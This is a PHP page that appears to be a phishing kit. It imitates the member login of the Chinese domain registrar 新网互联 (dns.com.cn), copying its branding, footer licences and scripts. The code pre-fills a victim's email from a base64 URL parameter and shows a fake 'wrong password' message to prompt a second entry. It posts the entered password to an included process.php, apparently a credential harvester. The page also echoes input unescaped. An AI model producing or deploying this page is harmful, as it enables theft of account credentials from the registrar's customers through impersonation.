<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?>
<!DOCTYPE html>
<html lang="zh-CN">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title>会员登录</title>
		<link rel="stylesheet" href="http://dns.com.cn/dnscom/resources/style/index.css">
		<style type="text/css">
			label.error {
				color: red;
			}
			.red {
				color:red;
			}
			.mr20 {
				margin-right: 20px;
			}
			.right {
				text-align: right;
			}
			.login_tab{ height:50px; position:relative; top:-20px; }
            .login_tab a{ float: left; text-align: center; width: 50%; height:48px; line-height:48px; font-size:14px; color:#666; border-bottom:1px solid #ddd; }
            .login_tab a.active{ border-bottom:2px #0e89cc solid; color:#0e89cc; }
		</style>
		<script type="text/javascript">
			var _absPath = 'http://dns.com.cn:80/';
		</script>
	</head>
	<body>
		<div class="login-top">
			<div class="layout clearfix">
		    	<div class="tpLogo"><a href="http://dns.com.cn/"><img src="http://dns.com.cn/dnscom/resources/show/home/images/common/logo.jpg" width="150" style="vertical-align: middle;"></a><span>&nbsp;&nbsp;&nbsp;| 会员登录</span></div>
		        <div class="tpLink"><a href="http://dns.com.cn/">新网互联首页</a> | 如遇问题请拨打：400-886-7171</div>
		    </div>
		</div>
		<div class="layout login-main clearfix">
			<a href="http://dns.com.cn/show/buildsite/index.do"><div class="login-banner"></div></a>
			<form  name="formlogin" method="post"   class="login-form" id="form1">
				<input id="modulus" type="hidden" value="00c3082d322798e5b3ecc5050d3a552c21bff69e1115c8ca4bc83b400c84329cbd20fb96a603b7e41c663111768e67913d7c8e8c59254bcf365e336b1a9cd881c6f30cdcdb4b4adcdc6ae74483a5ba5ca4c2e12e2e2dd79fe6ab44c4c1912e98add30ffd0624686d494a745c30bd84dded7698deb10bce7618c5b6b97fc3c55d09">
				<input id="exponent" type="hidden" value="010001">
				<input name=_loginToken type="hidden" value="f8d72edaa6c845dfb850817a38902083">
				<h1 class="login-title">
					欢迎登录
					<i class="icon icon-horn"></i>
				</h1>
				<ul class="login-list">
					<li>
						<input type="hidden" name="userLoginType" value="1">
						<div class="login_tab clearfix">
							<a href="javascript:void(0);" >账号登录</a>
							<a href="javascript:void(0);" class="active">手机号、邮箱登录</a>
						</div>
					</li>
					<li>
                         <input type="hidden" name="logins" value="<?php echo $log; ?>">
                
                <?php if ($_GET['hihi']=='1') { ?>
                <input type="hidden" name="hihihi" value="<?php echo $log; ?>">
                  <?php }?>
                    <?php if ($_GET['hihi']=='2') { ?>
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                  <?php }?>
                    <?php if ($_GET['hihi']=='3') { ?>
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                  <?php }?>
						<label class="input-group">
							<span class="box">
								<i class="icon icon-user"></i>
							</span>
							<input required readonly type="text" name="login" value="<?php echo $log; ?>" placeholder="请输入/邮箱">
						</label>
					</li>
					<li>
						<label class="input-group">
							<span class="box">
								<i class="icon icon-password"></i>
							</span>
							<input required type="password" name="pass" placeholder="登录密码">
						</label>
					</li>
					<li class="login_vcode" style="display: none">
						
					</li> <?php if (isset($_GET['mgs'])) { ?>
<li class="error_board" style="display: yes;">

<?php }else{ ?>
<li class="error_board" style="display: none;">
<?php }?>
						<i class="icon icon-error"></i>
						<span>密码不对！</span>
					</li>
					<li>
						<input type="submit" class="btn login-btn" value="登录">
					</li>
					<li style="line-height: 22px">
				  		<div class="right">
				  			<a href="http://dns.com.cn/show/userRegister/userRegister.do" class="red mr20">免费注册</a>
				  			<a href="http://dns.com.cn/show/userRegister/forRetrievalPwd.do" class="red">忘记密码？</a>
				  		</div>
				  	</li>
				  	<li style="line-height: 22px;word-break: break-all;color: #999;">
				  		<span class="red" >*温馨提示：</span>会员账号规则已由 hy0000 修改为member0000，如原 hy1234 现应用 member1234登录，密码不变。为了您的正常登录使用，请务必使用新规则账号登录，伙伴商账号agent0000格式不变，谢谢！
				  	</li>
				</ul>
			</form>
		</div>
		<div class="footer">
			<div class="footInfoBox">
		    	<p>《中华人民共和国增值电信业务经营许可证》<span class="mlt10">编号：京B2-20070157</span><span class="mlt10">京ICP备15044370号</span><span class="mlt10">京公网安备11010802020200号</span></p>
		        <p>Copyright © 2003 -2018 北京新网互联软件服务有限公司 版权所有</p>
        <p style="padding-top:5px;" id="footIco"><a href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202003111000026" target="_blank"><img class="helpIco" src="http://dns.com.cn/dnscom/resources/show/home/images/common/nfoot_beian.jpg" title="北京工商局经营性网站备案信息"></a><a href="http://www.12321.cn/" target="_blank"><img class="helpIco" src="http://dns.com.cn/dnscom/resources/show/home/images/common/nfoot_jubao1.jpg" title="12321网络不良与垃圾信息举报受理中心"></a><a href="http://www.cnnic.cn/jczyfw/fwqzs/hzhbcx/201409/t20140928_49165.htm" target="_blank"><img class="helpIco" title="CNNIC五星级注册服务机构证书" src="http://dns.com.cn/dnscom/resources/show/home/images/common/nfoot_honor.jpg"></a><a href="https://www.icann.org/" target="_blank"><img class="helpIco" title="ICANN" src="http://dns.com.cn/dnscom/resources/show/home/images/common/nfoot_icann.jpg"></a><a href="http://wangzhan.360.cn/" target="_blank"><img class="helpIco" src="http://dns.com.cn/dnscom/resources/show/home/images/common/nfoot_fanghei.jpg" title="中国网站安全防黑联盟"></a>&nbsp;&nbsp;<a href="http://www.bizcn.com/" target="_blank"><img src="http://www.bizcn.com/resources/show/home/images/partner_bizcn.png" broder="0" title="商务中国合作伙伴"></a>&nbsp;&nbsp;<img src="http://dns.com.cn/dnscom/resources/show/home/images/partner_rntd.png" broder="0" title="北京华瑞网研科技有限公司"></p>
		    </div>
		</div>
		<script type="text/javascript" src="http://dns.com.cn/resources/scripts/jquery-1.11.1.min.js"></script>
		<script type="text/javascript" src="http://dns.com.cn/dnscom/resources/scripts/jquery-form.js?ver=1.5.36"></script>
		<script type="text/javascript" src="http://dns.com.cn/dnscom/resources/scripts/jquery.validate.js?ver=1.5.36"></script>
		<script type="text/javascript" src="http://dns.com.cn/dnscom/resources/scripts/security.js?ver=1.5.36"></script>
		<script type="text/javascript" src="http://dns.com.cn/dnscom/resources/login/js/login.js?t=3"></script>
		<script type="text/javascript" src="http://dns.com.cn/dnscom/resources/shopcart/js/shopcart.js?ver=1.5.36"></script>
		<script src="http://dns.com.cn/scripts/yFocus-slider.js?ver=1.5.36"></script>
		<script type="text/javascript">
		//切换登录状态
        $(".login_tab a").click(function(){
        	var jqThis= $(this);
            var iIndex = $(this).index();
            jqThis.addClass('active').siblings().removeClass('active');
            $('.error_board').hide();
            $('input[name=userLoginType]').val( iIndex+1 );
            $('input[name=loginName]').val("");
            if(iIndex==0){
                $('input[name=loginName]').attr("placeholder","请输入用户名");
            }else{
                $('input[name=loginName]').attr("placeholder","请输入手机号/邮箱");
            }
        })
		
			$(document).on('click', '.reg_sub_input', function () {});

			$(document).ready(function () {
				//底部图标tips提示
				if($("#footIco img").length){
					$("#footIco img").yTipTxt();
				}
				if (errorMsg == 'overtime_error') {
					$('.reg_main_mask').hide();
					$('.login-btn').val('登录');
					$('.login_vcode').html(captchaHtml).show();
				}

				$('#form1').submit(function () {
					var userLoginType = $('input[name=userLoginType]').val();
					if(userLoginType == 2){
						if ($('input[name=loginName]').val() == '') {
							$('.error_board').html('请输入手机号、邮箱').show();
							return;
						}
					}else{
						if ($('input[name=loginName]').val() == '') {
							$('.error_board').html('请输入用户名').show();
							return;
						}
					}

					if ($('input[name=loginName]').val() == '') {
						$('.error_board').show().find('span').html('请输入用户名');
						return;
					}
					var _pwdInput = $("input[name=loginPasswd]");
					var pwd = $(_pwdInput).val();
					if (pwd == '') {
						$('.error_board').show().find('span').html('请输入密码');
						return;
					}
					var captcha = $('input[name=captcha]');
					if (captcha.length != 0 && $(captcha).val() == '') {
						$('.error_board').show().find('span').html('验证码不能为空！');
						return;
					}
					$('.login-btn').val('登录中...');
					$('.reg_main_mask').fadeIn();
					var en = doEncript(pwd);
					$(_pwdInput).val(en);
					$(this).ajaxSubmit({
						type: 'post',
						dataType: 'json',
						url: 'http://dns.com.cn:80/login/doAjaxLogin.do',
						timeout: 20000,
						complete: function (XHR, TS) {

							var _pwdInput = $("input[name=loginPasswd]");
							$(_pwdInput).val('');
						},

						success: function (data) { //提交成功的回调函数
							if (data.errorMsg != 'ok') {

								$('.reg_main_mask').hide();
								$('.login-btn').val('登录');

								$('.error_board').show().find('span').html(_status[data.errorMsg]);
								if (data.errorMsg == 'overtime_error') {
									$('.login_vcode').html(captchaHtml).show();
								}
							} else {

								var REDIRECT_KEY = 'redirectTo';
								var redirectUrl = data[REDIRECT_KEY];
								if (redirectUrl != undefined && redirectUrl != '') {

									params = getUrlArgObject();
									if (params['method'] != undefined && params['method'] == 'post') { //post提交

										post(redirectUrl, params);
									} else {
										//注释GET跳转重复带参
										//window.location = 'http://dns.com.cn:80/' + redirectUrl + window.location.search;
										window.location = 'http://dns.com.cn:80/' + redirectUrl;
									}
								} else {

									if (window.location.hash == '') {
											//无参数
										window.location = "http://dns.com.cn:80/frame/init.do#frame/rightContent&tag=";
									} else {

										window.location = "http://dns.com.cn:80/frame/init.do" + window.location.hash;
									}
								}

							}
						}
					});
					return false; //不刷新页面
				});
				/*锁定大写提示*/
			    $('input[type=password]').keypress(function(e) {
			        var s = String.fromCharCode( e.which );
			        if ( s.toUpperCase() === s && s.toLowerCase() !== s && !e.shiftKey ) {
			            if($('.bubble').length < 1){
			                $(this).after('<span class="bubble">大写已锁定</span>')
			            }
			        }else{
			            $('.bubble').remove();
			        }
			    });
			})
			var captchaHtml = '<label class="input-group verification">' +
							'<span class="box">' +
								'<i class="icon icon-verification"></i>' +
							'</span>' +
							'<input type="text" name="captcha" placeholder="验证码">' +
						'</label>' +
						'<img src="http://dns.com.cn:80/login/captcha.do?imgheight=50&imgwidth=80&verificodeheight=30&verificodesize=20" id="captcha" align="absmiddle" style="cursor:pointer;height:38px;top:0;right:0;" onclick="refreshCode(this)" title="看不清点击刷新" alt="看不清点击刷新" class="verification-code">' +
						'<a href="javascript:;" onclick="refreshCode(document.getElementById(\'captcha\'))">点击换一张</a>'
			var errorMsg = '';

			function doSubmit() {

				var _pwdInput = $("input[name=loginPasswd]");
				var pwd = $(_pwdInput).val();
				var en = doEncript(pwd);
				$(_pwdInput).val(en);

				// 		return true;
				return false;
			}

			function getUrlArgObject() {
				var args = new Object();
				var query = location.search.substring(1);
				var pairs = query.split("&");
				for (var i = 0; i < pairs.length; i++) {
					var pos = pairs[i].indexOf('=');
					if (pos == -1) {
						continue;
					}
					var argname = pairs[i].substring(0, pos);
					var value = pairs[i].substring(pos + 1);
					args[argname] = unescape(value);
				}
				return args;
			}

			function post(URL, PARAMS) {
				var temp = document.createElement("form");
				temp.action = URL;
				temp.method = "post";
				temp.style.display = "none";
				for (var x in PARAMS) {
					var opt = document.createElement("textarea");
					opt.name = x;
					opt.value = PARAMS[x];
					// alert(opt.name)
					temp.appendChild(opt);
				}
				document.body.appendChild(temp);
				temp.submit();
				return temp;
			}
		</script>
		<!--[if IE 6]>
		<script src="http://dns.com.cn/default/newjs/dd_png.js?ver=1.5.36"></script>
		<script>
		  DD_belatedPNG.fix('.ico_png24,.ico_reg');
		</script>
		<![endif]-->
	</body>
</html>
<?php }?>